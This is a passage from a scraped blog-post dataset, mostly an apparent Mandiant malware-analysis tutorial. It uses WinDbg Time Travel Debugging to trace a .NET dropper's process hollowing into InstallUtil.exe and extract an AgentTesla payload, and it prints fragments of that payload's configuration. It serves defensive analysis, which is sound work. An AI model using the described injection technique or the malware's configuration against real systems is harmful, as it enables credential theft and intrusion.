style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession.Processes</code><span style=\"vertical-align: baseline;\">: List of processes in the session.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession.TTD.Calls</code><span style=\"vertical-align: baseline;\">: Method to query calls that occurred during the trace.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$cursession.TTD.Memory</code><span style=\"vertical-align: baseline;\">: Method to query memory operations that occurred during the trace.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$curprocess</code><span style=\"vertical-align: baseline;\">: The current process. Equivalent to </span><code style=\"vertical-align: baseline;\">@$cursession.Processes[&lt;pid&gt;]</code><span style=\"vertical-align: baseline;\">. Frequently used items include:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$curprocess.Modules</code><span style=\"vertical-align: baseline;\">: List of currently loaded modules.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">@$curprocess.TTD.Events</code><span style=\"vertical-align: baseline;\">: List of events that occurred during the trace.</span></p>\n</li>\n</ul>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Investigating the Debugger Data Model to Identify Process Hollowing</span></h3>\n<p><span style=\"vertical-align: baseline;\">With a basic understanding of TTD concepts and a trace ready for investigation, we can now look for evidence of process hollowing. To begin, the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-calls-objects\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Calls</code></a><span style=\"vertical-align: baseline;\"> method can be used to search for specific Windows API calls. This search is effective even with a .NET sample because the managed code must interface with the unmanaged Windows API through </span><code style=\"vertical-align: baseline;\">P/Invoke</code><span style=\"vertical-align: baseline;\"> to perform a technique like process hollowing.</span></p>\n<p><span style=\"vertical-align: baseline;\">Process hollowing begins with the creation of a process in a suspended state via a call to </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">CreateProcess</code></a><span style=\"vertical-align: baseline;\"> with a creation flag value of </span><code style=\"vertical-align: baseline;\">0x4</code><span style=\"vertical-align: baseline;\">. The following query uses the </span><code style=\"vertical-align: baseline;\">Calls</code><span style=\"vertical-align: baseline;\"> method to return a table of each call to the </span><code style=\"vertical-align: baseline;\">kernel32</code><span style=\"vertical-align: baseline;\"> module\u2019s </span><code style=\"vertical-align: baseline;\">CreateProcess*</code><span style=\"vertical-align: baseline;\"> in the trace; the wildcard (</span><code style=\"vertical-align: baseline;\">*</code><span style=\"vertical-align: baseline;\">) ensures the query matches calls to either </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">CreateProcessW</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g @$cursession.TTD.Calls(\"kernel32!CreateProcess*\")</code></pre></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ttd fig 5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/time-travel-triage-fig5a.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This query returns a number of fields, not all of which are helpful for our investigation. To address this, we can apply the </span><a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.linq.enumerable.select?view=net-9.0\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Select</code></a><span style=\"vertical-align: baseline;\"> LINQ query to the original query, which allows us to specify which columns to display and rename them.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g @$cursession.TTD.Calls(\"kernel32!CreateProcess*\").Select(c =&gt; new { TimeStart = c.TimeStart, Function = c.Function, Parameters = c.Parameters, ReturnAddress = c.ReturnAddress})</code></pre></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ttd fig 6\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/time-travel-triage-fig6a.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The result shows one call to </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\"> starting at position </span><code style=\"vertical-align: baseline;\">58243:104D</code><span style=\"vertical-align: baseline;\">. Note the return address: since this is a .NET binary, the native code executed by the Just-In-Time (JIT) compiler won't be located in the application's main image address space (as it would be in a non-.NET image). Normally, an effective triage step is to filter results with a </span><a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.linq.enumerable.where?view=net-9.0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Where</span></a><span style=\"vertical-align: baseline;\"> LINQ query, limiting the return address to the primary module to filter out API calls that do not originate from the malware. This </span><code style=\"vertical-align: baseline;\">Where</code><span style=\"vertical-align: baseline;\"> filter, however, is less reliable when analyzing JIT-compiled code due to the dynamic nature of its execution space.</span></p>\n<p><span style=\"vertical-align: baseline;\">The next point of interest is the </span><code style=\"vertical-align: baseline;\">Parameters</code><span style=\"vertical-align: baseline;\"> field. Clicking on the DML link on the collapsed value </span><span style=\"vertical-align: baseline;\">{..}</span><span style=\"vertical-align: baseline;\"> displays </span><code style=\"vertical-align: baseline;\">Parameters</code><span style=\"vertical-align: baseline;\"> via a corresponding </span><span style=\"vertical-align: baseline;\">dx</span><span style=\"vertical-align: baseline;\"> command.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!CreateProcess*\").Select( c =&gt; new { TimeStart = c.TimeStart, Parameters = c.Parameters, ReturnAddress = c.ReturnAddress})[0].Parameters\n\n@$cursession.TTD.Calls(\"kernel32!CreateProcess*\").Select( c =&gt; new { TimeStart = c.TimeStart, Parameters = c.Parameters, ReturnAddress = c.ReturnAddress})[0].Parameters\n    [0x0]            : 0x55de700055de74\n    [0x1]            : 0x55e0780055e0ac\n    [0x2]            : 0x808000400000000\n    [0x3]            : 0x55de4000000000</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Function arguments are available under a specific </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-calls-objects\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">Calls</code></a><span style=\"vertical-align: baseline;\"> object as an array of values. However, before we investigate the parameters, there are some assumptions made by TTD that are worth exploring. Overall, these assumptions are affected by whether the process is 32-bit or 64-bit. An easy way to check the bitness of the process is by inspecting the </span><code style=\"vertical-align: baseline;\">DebuggerInformation</code><span style=\"vertical-align: baseline;\"> object.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:00&gt; dx Debugger.State.DebuggerInformation\nDebugger.State.DebuggerInformation                \n    ProcessorTarget  : X86 &lt;--- Process Bitness\n    Bitness          : 32\n    EngineFilePath   : C:\\Program Files\\WindowsApps\\&lt;SNIPPED&gt;\\x86\\dbgeng.dll\n    EngineVersion    : 10.0.27871.1001</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The key identifier in the output is </span><code style=\"vertical-align: baseline;\">ProcessorTarget</code><span style=\"vertical-align: baseline;\">: this value indicates the architecture of the guest process that was traced, regardless of whether the host operating system running the debugger is 64-bit.</span></p>\n<p><span style=\"vertical-align: baseline;\">TTD uses symbol information provided in a program database (PDB) file to determine the number of parameters, their types and the return type of a function. However, this information is only available if the PDB file contains </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/public-and-private-symbols\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">private symbols</span></a><span style=\"vertical-align: baseline;\">. While Microsoft provides PDB files for many of its libraries, these are often public symbols and therefore lack the necessary function information to interpret the parameters correctly. This is where TTD makes another assumption that can lead to incorrect results. Primarily, it </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-calls-objects\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">assumes</span></a><span style=\"vertical-align: baseline;\"> a maximum of four QWORD parameters and that the return value is also a QWORD. This assumption creates a mismatch in a 32-bit process (x86), where arguments are typically 32-bit (4-byte) values passed on the stack. Although TTD correctly finds the arguments on the stack, it misinterprets two adjacent 32-bit arguments as a single, 64-bit value.</span></p>\n<p><span style=\"vertical-align: baseline;\">One way to resolve this is to manually investigate the arguments on the stack. First we use the </span><code style=\"vertical-align: baseline;\">!tt</code><span style=\"vertical-align: baseline;\"> command to navigate to the beginning of the relevant call to </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; !tt 58243:104D\n\n(b48.12a4): Break instruction exception - code 80000003 (first/second chance not available)\nTime Travel Position: 58243:104D\neax=00bed5c0 ebx=039599a8 ecx=00000000 edx=75d25160 esi=00000000 edi=03331228\neip=75d25160 esp=0055de14 ebp=0055df30 iopl=0         nv up ei pl zr na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\nKERNEL32!CreateProcessA:\n75d25160 8bff            mov     edi,edi</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The return address is at the top of the stack at the start of a function call, so the following </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/d--da--db--dc--dd--dd--df--dp--dq--du--dw--dw--dyb--dyd--display-memor\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">dd command</span></a><span style=\"vertical-align: baseline;\"> skips over this value by adding an offset of </span><code style=\"vertical-align: baseline;\">4</code><span style=\"vertical-align: baseline;\"> to the </span><code style=\"vertical-align: baseline;\">ESP</code><span style=\"vertical-align: baseline;\"> register to properly align the function arguments.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dd /c 1 esp+4 L0A\n0055de18  0055de74  &lt;-- Application Name\n0055de1c  0055de70\n0055de20  0055e0ac\n0055de24  0055e078\n0055de28  00000000\n0055de2c  08080004  &lt;-- Creation Flags - 0x4 (CREATE_SUSPENDED)\n0055de30  00000000\n0055de34  0055de40\n0055de38  0055e0c0\n0055de3c  0055e068</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The value of </span><code style=\"vertical-align: baseline;\">0x4</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">CREATE_SUSPENDED</code><span style=\"vertical-align: baseline;\">) set in the bitmask for the </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">dwCreationFlags</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> argument</span></a><span style=\"vertical-align: baseline;\"> (6th argument) indicates that the process will be created in a suspended state.</span></p>\n<p><span style=\"vertical-align: baseline;\">The following command dereferences </span><code style=\"vertical-align: baseline;\">esp+4</code><span style=\"vertical-align: baseline;\"> via the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/address-and-address-range-syntax\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">poi</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> operator</span></a><span style=\"vertical-align: baseline;\"> to retrieve the application name string pointer then uses the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/d--da--db--dc--dd--dd--df--dp--dq--du--dw--dw--dyb--dyd--display-memor\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">da</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> command</span></a><span style=\"vertical-align: baseline;\"> to display the ASCII string.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; da poi(esp+4)\n0055de74  \"C:\\Windows\\Microsoft.NET\\Framewo\"\n0055de94  \"rk\\v4.0.30319\\InstallUtil.exe\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The command reveals that the target application is </span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\">, which aligns with the findings from basic analysis.</span></p>\n<p><span style=\"vertical-align: baseline;\">It is also useful to retrieve the handle to the newly created process in order to identify subsequent operations performed on it. The handle value is returned through a pointer (</span><code style=\"vertical-align: baseline;\">0x55e068</code><span style=\"vertical-align: baseline;\"> in the earlier referenced output) to a </span><code style=\"vertical-align: baseline;\">PROCESS_INFORMATION</code><span style=\"vertical-align: baseline;\"> structure passed as the last argument. This structure has the following definition:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>typedef struct _PROCESS_INFORMATION {\n  HANDLE hProcess;\n  HANDLE hThread;\n  DWORD  dwProcessId;\n  DWORD  dwThreadId;\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">After the call to </span><code style=\"vertical-align: baseline;\">CreateProcessA</code><span style=\"vertical-align: baseline;\">, the first member of this structure should be populated with the handle to the process. Step out of the call using the </span><code style=\"vertical-align: baseline;\">gu</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">(Go Up) command to examine the populated structure.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; gu\nTime Travel Position: 58296:60D\n\n0:000&gt; dd /c 1 0x55e068 L4\n0055e068  00000104 &lt;-- handle to process\n0055e06c  00000970\n0055e070  00000d2c\n0055e074  00001c30</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In this trace, </span><code style=\"vertical-align: baseline;\">CreateProcess</code><span style=\"vertical-align: baseline;\"> returned </span><code style=\"vertical-align: baseline;\">0x104</code><span style=\"vertical-align: baseline;\"> as the handle for the suspended process.</span></p>\n<p><span style=\"vertical-align: baseline;\">The most interesting operation in process hollowing for the purpose of triage is the allocation of memory and subsequent writes to that memory, commonly performed via calls to </span><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">WriteProcessMemory</code></a><span style=\"vertical-align: baseline;\">. The previous </span><code style=\"vertical-align: baseline;\">Calls</code><span style=\"vertical-align: baseline;\"> query can be updated to identify calls to </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -g @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})\n=============================================================\n=          = (+) TimeStart = (+) ReturnAddress = (+) Params =\n=============================================================\n= [0x0]    - 6A02A:4B4     - 0x15032e2         - {...}      =\n= [0x1]    - 6E516:A91     - 0x15032e2         - {...}      =\n= [0x2]    - 729A2:511     - 0x15032e2         - {...}      =\n= [0x3]    - 76E2D:750     - 0x15032e2         - {...}      =\n= [0x4]    - 7B2DF:C1C     - 0x15032e2         - {...}      =\n=============================================================\n</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The query returns four results. The following queries expand the arguments for each call to </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[0].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[0].Params                \n    [0x0]            : 0x104        &lt;-- Target process handle\n    [0x1]            : 0x400000     &lt;-- Target Address\n    [0x2]            : 0x9810af0    &lt;-- Source buffer\n    [0x3]            : 0x200        &lt;-- Write size\n\n0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[1].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[1].Params                \n    [0x0]            : 0x104\n    [0x1]            : 0x402000\n    [0x2]            : 0x984cb10\n    [0x3]            : 0x3b600\n\n0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[2].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[2].Params                \n    [0x0]            : 0x104\n    [0x1]            : 0x43e000\n    [0x2]            : 0x387d9d0\n    [0x3]            : 0x600\n\n0:000&gt; dx -r1 @$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[3].Params\n@$cursession.TTD.Calls(\"kernel32!WriteProcessMemory*\").Select( c =&gt; new { TimeStart = c.TimeStart, ReturnAddress = c.ReturnAddress, Params = c.Parameters})[3].Params                \n    [0x0]            : 0x104\n    [0x1]            : 0x440000\n    [0x2]            : 0x3927a78\n    [0x3]            : 0x200</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\"> has the following function signature:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>BOOL WriteProcessMemory(\n  [in]  HANDLE  hProcess,\n  [in]  LPVOID  lpBaseAddress,\n  [in]  LPCVOID lpBuffer,\n  [in]  SIZE_T  nSize,\n  [out] SIZE_T  *lpNumberOfBytesWritten\n);</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Investigating these calls to </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\"> shows that the target process handle is </span><code style=\"vertical-align: baseline;\">0x104</code><span style=\"vertical-align: baseline;\">, which represents the suspended process. The second argument defines the address in the target process. The arguments to these calls reveal a pattern common to PE loading: the malware writes the PE header followed by the relevant sections at their virtual offsets.</span></p>\n<p><span style=\"vertical-align: baseline;\">It is worth noting that the memory of the target process cannot be analyzed from this trace. To record the execution of a child process, pass the </span><code style=\"vertical-align: baseline;\">-children</code><span style=\"vertical-align: baseline;\"> flag to the </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> utility. This will generate a trace file for each process, including all child processes, spawned during execution.</span></p>\n<p><span style=\"vertical-align: baseline;\">The first memory write to what is likely the target process's base address (</span><code style=\"vertical-align: baseline;\">0x400000</code><span style=\"vertical-align: baseline;\">) is </span><code style=\"vertical-align: baseline;\">0x200</code><span style=\"vertical-align: baseline;\"> bytes. This size is consistent with a PE header, and examining the source buffer (</span><code style=\"vertical-align: baseline;\">0x9810af0</code><span style=\"vertical-align: baseline;\">) confirms its contents.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; db 0x9810af0\n09810af0  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............\n09810b00  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......\n09810b10  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n09810b20  00 00 00 00 00 00 00 00-00 00 00 00 80 00 00 00  ................\n09810b30  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th\n09810b40  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno\n09810b50  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS \n09810b60  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-dh\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">!dh</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> extension</span></a><span style=\"vertical-align: baseline;\"> can be used to parse this header information.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; !dh 0x9810af0\n\nFile Type: EXECUTABLE IMAGE\nFILE HEADER VALUES\n     14C machine (i386)\n       3 number of sections\n66220A8D time date stamp Fri Apr 19 06:09:17 2024\n\n----- SNIPPED -----\n\nOPTIONAL HEADER VALUES\n     10B magic #\n   11.00 linker version\n         ----- SNIPPED -----\n       0 [       0] address [size] of Export Directory\n   3D3D4 [      57] address [size] of Import Directory\n   ----- SNIPPED -----\n       0 [       0] address [size] of Delay Import Directory\n    2008 [      48] address [size] of COR20 Header Directory\n\nSECTION HEADER #1\n   .text name\n   3B434 virtual size\n    2000 virtual address\n   3B600 size of raw data\n     200 file pointer to raw data\n----- SNIPPED -----\n\nSECTION HEADER #2\n   .rsrc name\n     546 virtual size\n   3E000 virtual address\n     600 size of raw data\n   3B800 file pointer to raw data\n----- SNIPPED -----\n\nSECTION HEADER #3\n  .reloc name\n       C virtual size\n   40000 virtual address\n     200 size of raw data\n   3BE00 file pointer to raw data\n----- SNIPPED -----</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The presence of a COR20 header directory (a pointer to the .NET header) indicates that this is a .NET executable.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">The relative virtual addresses for the </span><code style=\"vertical-align: baseline;\">.text</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0x2000</code><span style=\"vertical-align: baseline;\">), </span><code style=\"vertical-align: baseline;\">.rsrc</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0x3E000</code><span style=\"vertical-align: baseline;\">), and </span><code style=\"vertical-align: baseline;\">.reloc</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0x40000</code><span style=\"vertical-align: baseline;\">) also align with the target addresses of the </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\"> calls.</span></p>\n<p><span style=\"vertical-align: baseline;\">The newly discovered PE file can now be extracted from memory using the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-writemem--write-memory-to-file-\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">writemem</code></a><span style=\"vertical-align: baseline;\"> command.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; .writemem c:\\users\\flare\\Desktop\\headers.bin 0x9810af0 L0x200\nWriting 200 bytes.\n\n0:000&gt; .writemem c:\\users\\flare\\Desktop\\text.bin 0x984cb10 L0x3b600\nWriting 3b600 bytes.......................................................................................................................\n\n0:000&gt; .writemem c:\\users\\flare\\Desktop\\rsrc.bin 0x387d9d0 L0x600\nWriting 600 bytes.\n\n0:000&gt; .writemem c:\\users\\flare\\Desktop\\reloc.bin 0x3927178 L0x200\nWriting 200 bytes.</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Using a hex editor, the file can be reconstructed by placing each section at its raw offset. A quick analysis of the resulting .NET executable (SHA256: </span><a href=\"https://www.virustotal.com/gui/file/4dfe67a8f1751ce0c29f7f44295e6028ad83bb8b3a7e85f84d6e251a0d7e3076\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">4dfe67a8f1751ce0c29f7f44295e6028ad83bb8b3a7e85f84d6e251a0d7e3076</code></a><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\"> in dnSpy reveals its configuration data.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>----- SNIPPED -----\n\n// Token: 0x0400000E RID: 14\npublic static bool EnableKeylogger = Convert.ToBoolean(\"false\");\n// Token: 0x0400000F RID: 15\npublic static bool EnableScreenLogger = Convert.ToBoolean(\"false\");\n// Token: 0x04000010 RID: 16\npublic static bool EnableClipboardLogger = Convert.ToBoolean(\"false\");\n// Token: 0x0400001C RID: 28\npublic static string SmtpServer = \"&lt;REDACTED\";\n// Token: 0x0400001D RID: 29\npublic static string SmtpSender = \"&lt;REDACTED&gt;\";\n// Token: 0x04000025 RID: 37\npublic static string StartupDirectoryName = \"eXCXES\";\n// Token: 0x04000026 RID: 38\npublic static string StartupInstallationName = \"eXCXES.exe\";\n// Token: 0x04000027 RID: 39\npublic static string StartupRegName = \"eXCXES\";\n----- SNIPPED -----</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Conclusion: TTD as an Analysis Accelerator</span></h3>\n<p><span style=\"vertical-align: baseline;\">This case study demonstrates the benefit of treating TTD execution traces as a searchable database. By capturing the payload delivery and directly querying the Debugger Data Model for specific API calls, we quickly bypassed the multi-layered obfuscation of the .NET dropper. The combination of targeted data model queries and LINQ filters (for </span><code style=\"vertical-align: baseline;\">CreateProcess*</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">WriteProcessMemory*</code><span style=\"vertical-align: baseline;\">) and low-level commands (</span><code style=\"vertical-align: baseline;\">!dh</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">.writemem</code><span style=\"vertical-align: baseline;\">) allowed us to isolate and extract the hidden AgentTesla payload, yielding critical configuration details in a matter of minutes.</span></p>\n<p><span style=\"vertical-align: baseline;\">The tools and environment used in this analysis\u2014including the latest version of WinDbg and TTD\u2014are readily available via the </span><a href=\"https://github.com/mandiant/flare-vm\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">FLARE-VM</span></a><span style=\"vertical-align: baseline;\"> installation script. We encourage you to streamline your analysis workflow with\u00a0 this pre-configured environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">The TTD trace can be </span><a href=\"https://www.virustotal.com/gui/file/8610982c012f64dbf059e20ce67a625cf0cd99a307ded41b754f1e4d80ee8e94\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">downloaded from VirusTotal</span></a><span style=\"vertical-align: baseline;\"> along with the original </span><a href=\"https://www.virustotal.com/gui/file/b7268f9814ddac66d6a4c1c43115d19de4fdb23e4d30ae233aeb51127213a1df\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">sample</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-13 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/expanding-support-for-ai-developers-on-hugging-face/",
        "title": "Expanding support for AI developers on Hugging Face",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Hugging-Face-Faster-Collab-Hero.max-600x600.png",
        "author": "Ryan J. Salva",
        "track": null,
